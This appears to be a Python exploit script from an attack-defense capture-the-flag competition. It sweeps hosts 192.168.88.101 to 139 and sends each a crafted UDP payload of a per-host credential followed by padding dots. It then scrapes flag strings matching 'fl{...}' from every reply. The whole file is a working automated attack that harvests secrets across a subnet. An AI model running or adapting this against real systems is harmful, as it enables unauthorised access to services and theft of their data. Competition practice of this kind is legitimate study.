#!/usr/bin/env python3

from socket import SHUT_RDWR, create_connection, socket, AF_INET, SOCK_DGRAM
from time import sleep
import re

p = re.compile('fl\{.*\}')

ports_and_usernames = {
    101: (8220, 'pzFhipYdyM98qFZv'),
    102: (8112, 'nVKu2Bjh4KSJfCWp'),
    103: (8865, '2LfOyIkNDobhkqcR'),
    104: (8230, 'AdAhbAn6k7wEvTb9'),
    105: (8811, 'fuxpzePW87TicUvH'),
    106: (8797, 'OVsb24bXvgJLMvG4'),
    107: (8947, 'cRipACJtIsHGHoJU'),
    108: (8244, 'HAtSXikuSvvVCavJ'),
    109: (8631, 'df5rFkii8QxSevVo'),
    110: (8906, '9PXZ86RZJtK6efP1'),
    111: (8006, 'Dv8freSleRfRWxt2'),
    112: (8402, 'P1PvMgzJIZfmrS0R'),
    113: (8467, 'SsMxTMISPeuvm0pb'),
    114: (8400, 'fqpqnoBzLgafIRKP'),
    115: (8045, 'qjCEnYFTa4yW4qgL'),
    116: (8793, 'yR1Hmnqm8IfgMjfA'),
    117: (8568, 'ruO4yEsmd8qz8GTb'),
    118: (8228, 'dXC0ouKxxTS1OIEg'),
    119: (8628, 'DFFbF5und5DiTl0L'),
    120: (8466, 'ZvqdHUpZzddxD9iF'),
    121: (8116, 'UXDJOQzwitZfNUuk'),
    122: (8976, 'EjemdFCjZ66OkuMU'),
    123: (8975, 'KXY1lNpO2DM3SaBB'),
    124: (8567, 'DYnuJThH92VUTvSR'),
    125: (8062, 'jlD06mKZ3WzuniSY'),
    126: (8139, 'kDSaTRg1syhndFya'),
    127: (8703, 'QnMr3ErBS4a2to1N'),
    128: (8226, 'v86GmxmsNzFKHdhL'),
    129: (8537, 'QPMAMxoZg1qt9sjE'),
    130: (8367, 'hjFnxW0vDWDHOeYx'),
    131: (8684, 'XYGo38RPhDrppwPF'),
    132: (8899, '7HrmYDkOWrWVhQJM'),
    133: (8397, 'h4LRBCBKvUSu8JwY'),
    134: (8979, '4XClWYFwr5wqoRuB'),
    135: (8447, 'QUi9EkHUEztMC4lu'),
    136: (8592, 'ay6IME8dhubo5fIL'),
    137: (8251, 'fARbMDOoOPXtn3EJ'),
    138: (8948, '5HKqhsUC8ce9tUTG'),
    139: (8167, 'DTe2m02fsWdR2M7b'),
    }

for i in range(101,140):
  serverAdress = f"192.168.88.{i}"
  portno = ports_and_usernames[i][0]

  sock = socket(AF_INET, SOCK_DGRAM)
  sock.settimeout(10)

  attack1 = bytes(f"{ports_and_usernames[i][1]} ...........................", "UTF-8")

  sock.sendto(attack1, (serverAdress, portno))

  try:
    res = sock.recv(4096)

    print(f"{i}: {p.findall(res.decode(errors='replace'))}")
  except:
    print(f"{i}: timeout")

  sock.close()